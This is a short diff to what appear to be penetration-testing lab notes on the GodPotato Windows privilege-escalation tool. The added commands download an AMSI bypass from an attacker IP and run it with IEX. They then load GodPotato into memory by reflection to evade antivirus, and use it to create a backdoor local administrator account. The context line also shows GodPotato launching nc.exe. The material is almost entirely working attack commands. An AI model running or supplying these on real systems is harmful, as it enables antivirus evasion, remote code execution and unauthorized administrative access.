@@ -83,3 +83,12 @@ PS C:\windows\tasks> .\GodPotato-NET4.exe -cmd "cmd /c c:\windows\tasks\nc.exe -
 ```
 
 
+Running GodPotato with AV acitve:
+
+```bash
+(New-Object System.Net.WebClient).DownloadString('http://10.10.14.6/amsi1.txt') | IEX
+$bytes = (New-Object System.Net.WebClient).DownloadData('http://10.10.14.6/GodPotato-NET4.exe')
+$assembly = [System.Reflection.Assembly]::Load($bytes)
+$assembly.EntryPoint.Invoke($null, @(,[string[]]@('-cmd','net user garffff Password123 /add')))
+$assembly.EntryPoint.Invoke($null, @(,[string[]]@('-cmd','net localgroup administrators garffff /add')))
+```
